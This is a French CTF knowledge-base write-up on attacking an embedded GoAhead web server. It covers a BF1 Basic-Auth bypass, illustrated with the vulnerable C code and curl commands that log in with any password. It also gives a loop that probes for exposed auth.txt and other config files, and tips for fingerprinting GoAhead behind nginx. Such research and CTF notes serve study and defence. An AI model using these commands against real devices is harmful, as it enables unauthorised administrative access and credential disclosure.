# VULN#005 — Acme Gateway (GoAhead embedded web server)

> Challenge bugpwn `<HOST>:<PORT>`, catégorie Vuln Research, 30 pts.
> Analyse récupérée depuis 13.63.167.233:/home/ubuntu/CtfAndHacking/knowledge/web.md (sections GoAhead).

## GoAhead BF1 Basic-Auth Bypass (SA-2026-0001)

**Catégorie :** web
**Mots-clés :** goahead, embedthis, basic-auth, bypass, bf1, blowfish, iot, embedded
**CVE / Advisory :** GOAHEAD-SA-2026-0001 (critique)

### Contexte

Embedthis GoAhead ≤ 6.1.0 (et branches 6.0.x avant correctif). Le bug est
corrigé dans la release 6.1.1 mais la chaîne de version `ME_VERSION` affichée
par un binaire ne garantit pas que le patch soit appliqué — vérifier la
source. Repère dans `src/auth.c`, fonction `websVerifyPasswordFromFile`.

### Indicateurs

- Serveur embarqué qui annonce (ou cache) `GoAhead`.
- `WWW-Authenticate: Basic realm="example.com"` (realm par défaut).
- `auth.txt` avec un utilisateur dont le hash commence par `BF1:` (format
  Blowfish salé maison : `BF1:<rounds>:<salt>:<hash>`).

### Méthode

Dans la version vulnérable :

```c
if (sstarts(wp->user->password, "BF1:")) {
    success = websCheckPassword(wp->password, wp->user->password); // vrai check
    wfree(wp->password);
    wp->password = sclone(wp->user->password);   // password == stored hash
}
...
if (wp->digest) {
    success = pmatch(wp->password, wp->digest);
} else {
    success = pmatch(wp->password, wp->user->password); // compare la chaîne à elle-même
}
return success;
```

Le résultat du vrai contrôle est écrasé par un `pmatch(x, x)` qui renvoie
toujours vrai. Pour tout utilisateur stocké en `BF1:`, n'importe quel mot de
passe est accepté en Basic auth. Il faut juste connaître le **nom** d'un user
`BF1:` possédant le rôle attendu par la route (`manage` pour `/admin/`).

### Commandes génériques

```bash
# 1) Repérer la cible et l'auth demandée
curl -I http://<HOST>:<PORT>/<ADMIN_PATH>

# 2) Trouver le nom d'un user BF1 (voir fiche config leak ci-dessous ou wordlist)
curl -s http://<HOST>:<PORT>/config/auth.txt | grep '^user'

# 3) Login avec n'importe quel mot de passe
curl -i -u "<BF1_USER>:anything" http://<HOST>:<PORT>/<ADMIN_PATH>
# → 302 + Set-Cookie: -goahead-session-=::webs.session::...
```

### Pièges

- Si un reverse-proxy (nginx `limit_req`) est devant, les tentatives sont
  rate-limitées (429). Espacer de 15–20 s par essai, pas de bruteforce massif.
- Le bypass ne marche QUE pour les users `BF1:`. Les users MD5 restent sains.
- La route cible doit matcher les `abilities` de l'utilisateur bypassé.
- Le `realm="example.com"` est le défaut `ME_GOAHEAD_REALM` : ne pas croire
  qu'il désigne un vrai domaine.

### Validation

- Réponse `302` vers la page post-login + cookie `-goahead-session-=...`.
- Les requêtes suivantes avec ce cookie accèdent au contenu protégé sans
  renvoyer l'en-tête `Authorization`.

### Références

- GoAhead 6.1.1 release notes (11 advisories SA-2026-0001..0011).
- Source auditable : `src/auth.c:598-625`.

---

## Exposition des fichiers de config GoAhead sous `/config/`

**Catégorie :** web
**Mots-clés :** goahead, config leak, auth.txt, route.txt, information disclosure

### Contexte

Le `fileHandler` de GoAhead sert directement tout fichier présent sous le
`documents root`. Si un intégrateur place `auth.txt` et `route.txt` dans un
sous-dossier `web/config/` (par facilité de packaging), ces fichiers deviennent
accessibles sans auth tant qu'aucune route ne les protège.

### Indicateurs

- Une requête sur `/config/` renvoie un `302` vers `/config/index.html`
  (preuve que `web/config/` existe) alors que `/config/index.html` est en 404.
- Pas de route restrictive déclarée dans la section visible du `route.txt`
  (si on arrive à le lire).

### Méthode

Lister les noms attendus. Les fichiers de configuration GoAhead par défaut :
`auth.txt`, `route.txt`. Les logs/backups usuels : `users.txt`, `users.json`,
`config.ini`, `config.conf`, `goahead.conf`, `.htaccess`, `README`.

```bash
for f in auth.txt route.txt users.txt users.json config.ini goahead.conf; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<HOST>:<PORT>/config/$f")
  echo "$code $f"
done
```

### Pièges

- Le path traversal classique (`/../auth.txt`) est bloqué par
  `websNormalizeUriPath` + `websValidUriChars`. Il faut vraiment que le
  fichier soit dans le `documents root`.
- Les routes `route uri=/...` matchent par préfixe : une route catch-all
  `uri=/` sans `auth=` laisse passer tout ce qui n'est pas déjà matché.

### Validation

- Le `auth.txt` récupéré contient des lignes `user name=<X> password=<HASH>
  roles=<R>`. Les hash `BF1:...` sont immédiatement exploitables via
  [GoAhead BF1 Basic-Auth Bypass](#goahead-bf1-basic-auth-bypass-sa-2026-0001).

---

## Fingerprint GoAhead derrière nginx (Server header spoofé)

**Catégorie :** web
**Mots-clés :** fingerprint, goahead, nginx, reverse proxy, header spoof

### Contexte

Des déploiements embarqués mettent nginx devant GoAhead et forcent
`Server: nginx` dans la réponse. L'empreinte GoAhead reste reconnaissable à
d'autres signaux.

### Indicateurs

- Corps d'erreur type GoAhead :
  `<html><head><title>Document Error: Not Found</title></head><body><h2>Access Error: Not Found</h2></body></html>`
  (vs. nginx qui met `<center><h1>...</h1></center><hr><center>nginx</center>`).
- Redirect `302` sur un répertoire vers `/.../index.html` avec un body
  mentionnant une adresse interne : `This document has moved to a new <a
  href="http://<INTERNAL_IP>:<PORT>/...">location</a>.` → fuite de l'IP/port
  backend.
- `WWW-Authenticate: Basic realm="example.com"` sur une route protégée.
- `Last-Modified` avec un format non standard : `Thu Oct 15 21:44:55 2026`
  (format `ctime`, pas RFC 7231).
- Cookie de session nommé `-goahead-session-` dont la valeur commence par
  `::webs.session::`.

### Méthode

1. Différencier le 404 nginx d'une méthode interdite (`TRACE`) de celui d'une
   URL inconnue (`/foo`) : le premier passe par nginx seul, le second est
   servi par GoAhead → styles différents.
2. Faire une requête sur `/` : si GoAhead redirige vers `/index.html` avec le
   body "This document has moved…", c'est signé.

### Pièges

- La valeur `Server:` ne doit jamais être traitée comme autorité.
- Si plusieurs backends existent (upstream pool), l'IP fuite peut varier.

---

